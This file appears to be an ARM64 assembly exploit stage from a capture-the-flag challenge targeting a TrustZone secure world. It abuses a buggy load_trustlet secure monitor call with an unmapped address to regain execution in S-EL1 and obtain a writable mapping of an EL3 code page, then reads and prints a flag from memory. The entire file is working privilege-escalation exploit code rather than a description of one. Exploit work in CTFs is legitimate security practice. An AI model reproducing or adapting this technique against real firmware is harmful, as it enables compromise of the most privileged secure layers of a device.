.section .text
.global _start
_start:

    # We're again running in EL2, but this time we'll execute
    # the buggy securecall to obtain a r/w mapping in S-EL0
    # that points to an EL3 text page
    
    # Pass an unmapped address to load_trustlet in S-EL1
    # This will fault in the kernel and return to our address
    # but still executing in S-EL1
    ldr x0, =0x83000005
    ldr x1, =0x2000000
    mov x2, 0x2000
    mov x3, 0
    smc #0

    # We never reach here

    # EL2 has returned to give us the flag, so print it out
    ldr x15, =0x4000f000
    add x16, x15, #0x20

loop:
    ldr x0, [x15]
    ldr x8, =0x40100690
    blr x8
    add x15, x15, #1
    cmp x15, x16
    bne loop

    # Invoke any securecall to continue running in S-EL1
    ldr x0, =0x83000003
    smc #0

hmm:
    b hmm
